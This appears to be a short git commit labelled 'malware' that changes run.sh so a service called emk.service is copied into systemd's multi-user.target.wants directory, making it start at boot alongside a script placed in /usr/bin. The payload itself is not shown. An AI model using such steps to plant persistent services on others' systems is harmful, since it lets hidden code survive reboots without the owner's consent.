256d7b886cda622d346fccb10fed67944a810df4
enes2 <ekaya2110@posta.pau.edu.tr>
2023-12-26 04:11:13 +0300

    malware

--- run.sh
+++ run.sh
@@ -4,6 +4,10 @@ mv emk.service /etc/systemd/system/
 
 chmod +x emk.service
 
+cp emk.service -r /etc/systemd/system/multi-user.target.wants/
+
+chmod +x emk.service
+
 mv emk.sh /usr/bin/
 
 chmod +x emk.sh
